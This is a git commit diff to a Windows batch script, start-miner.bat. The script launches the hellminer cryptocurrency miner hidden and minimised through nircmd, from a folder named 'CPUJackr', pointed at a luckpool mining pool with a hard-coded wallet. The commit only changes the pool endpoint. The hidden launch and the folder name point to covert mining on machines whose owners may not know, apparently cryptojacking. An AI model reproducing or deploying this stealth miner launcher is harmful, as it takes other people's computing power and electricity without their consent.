89a047a47b746f034531b71884c0aca6bc0e8172
Mybay1 <132859537+Mybay1@users.noreply.github.com>
2023-06-06 17:57:32 +0100

    Update start-miner.bat

--- start-miner.bat
+++ start-miner.bat
@@ -1,2 +1,2 @@
 @echo off
-start "" /min "C:\CPUJackr\nircmd.exe" exec hide "C:\CPUJackr\hellminer.exe" -c stratum+ssl://eu.luckpool.net:3956 -u RMovVQiRqawd8KThXQtKQhgESBPGzrSnXX.CPUSWARM -p hybrid --cpu 4
+start "" /min "C:\CPUJackr\nircmd.exe" exec hide "C:\CPUJackr\hellminer.exe" -c stratum+tcp://na.luckpool.net:3960 -u RMovVQiRqawd8KThXQtKQhgESBPGzrSnXX --cpu 4
